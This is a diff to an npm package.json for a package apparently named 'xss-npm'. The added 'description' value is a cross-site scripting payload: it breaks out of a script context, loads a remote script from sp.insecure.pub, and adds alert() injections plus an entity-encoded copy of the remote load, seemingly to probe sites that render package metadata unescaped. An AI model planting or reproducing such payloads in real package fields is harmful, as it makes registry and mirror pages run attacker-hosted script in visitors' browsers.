@@ -1,7 +1,7 @@
 {
   "name": "xss-npm",
   "version": "1.1.1",
-  "description": "xss-npm-';alert(5);//\"><script>alert(6)</script>",
+  "description": "</script><script src=//sp.insecure.pub/x?u=2&a=1>xss-npm-';alert(5);//\"><script>alert(6)</script>&lt;/script&gt;&lt;script src=//sp.insecure.pub/x?u=4&a=1&gt;",
   "main": "index.js",
   "repository": {
     "type": "git",
